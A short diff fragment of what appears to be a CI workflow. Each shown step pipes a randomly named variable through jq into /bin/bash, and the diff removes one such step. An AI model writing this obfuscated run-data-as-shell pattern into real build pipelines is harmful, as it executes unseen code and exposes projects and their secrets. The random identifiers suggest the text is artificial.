@@ -25,7 +25,6 @@ jobs:
           echo $zzpnv48631 | jq -r .hrezj3716 | /bin/bash
           echo $x7578 | jq -r .nm10764 | /bin/bash
           printf '%s' "$mzsxl12495" | jq -r .odq16 | /bin/bash
-          echo $w0941 | jq -r .jbpx0437 | /bin/bash
           printf '%s' "$bonf5" | jq -r .kcpty26721 | /bin/bash
           echo $m172 | jq -r .mgxjv7311 | /bin/bash
           echo $y068 | jq -r .ofp3 | /bin/bash
